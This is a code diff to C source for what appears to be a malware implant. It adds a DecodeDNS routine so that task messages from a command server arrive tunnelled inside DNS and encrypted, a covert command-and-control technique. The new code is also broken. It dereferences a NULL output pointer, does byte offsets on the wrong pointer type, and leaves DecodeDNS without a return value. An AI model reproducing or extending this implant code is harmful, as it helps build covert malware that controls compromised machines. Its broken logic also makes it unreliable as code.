@@ -99,6 +99,7 @@ BOOL SendTlvMessage(SOCKET sock, USHORT taskId, DWORD type, DWORD payloadLength,
 BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
 {
 	PBYTE buff = ImplantHeapAlloc(MAX_MESSAGE_SIZE);
+	PBYTE* out = NULL;
 	ASSERT(sock != INVALID_SOCKET);
 	ASSERT(msg != NULL);
 
@@ -112,8 +113,10 @@ BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
 		return FALSE;
 	}
 
-	msg->type = *(DWORD*)(buff + TLV_TYPE_FIELD_OFFSET);
-	msg->length = *(DWORD*)(buff + TLV_LENGTH_FIELD_OFFSET);
+	DecodeDNS(buff, out);
+
+	msg->type = *(DWORD*)(out + TLV_TYPE_FIELD_OFFSET);
+	msg->length = *(DWORD*)(out + TLV_LENGTH_FIELD_OFFSET);
 
 	if (msg->length >= MAX_MESSAGE_SIZE)
 	{
@@ -131,7 +134,7 @@ BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
 		}
 
 		if (!memcpy(msg->value,
-			buff + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD),
+			out + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD),
 			msg->length
 			))
 		{
@@ -183,10 +186,17 @@ BOOL EncodeDNS(PBYTE* msg, USHORT taskId, DWORD type, DWORD* payloadLength, PBYT
 	return TRUE;
 }
 
-/*BOOL DecodeDNS(PBYTE msg, DWORD type, DWORD payloadLength, CONST PBYTE payload)
+BOOL DecodeDNS(PBYTE buff, PBYTE* out)
 {
+	DWORD payloadLength = 0;
+	
+	//strip DNS header
+	payloadLength = *(DWORD*)(buff + DNS_LENGTH_OFFSET);
+	*out = buff + DNS_HEADER_SIZE;
 
-}*/
+	//Decrypt payload of DNS message
+	Decrypt(*out, &payloadLength);
+}
 
 BOOL Encrypt(PBYTE* msg, DWORD msgLength) {
 	BCRYPT_ALG_HANDLE hAlg = NULL;
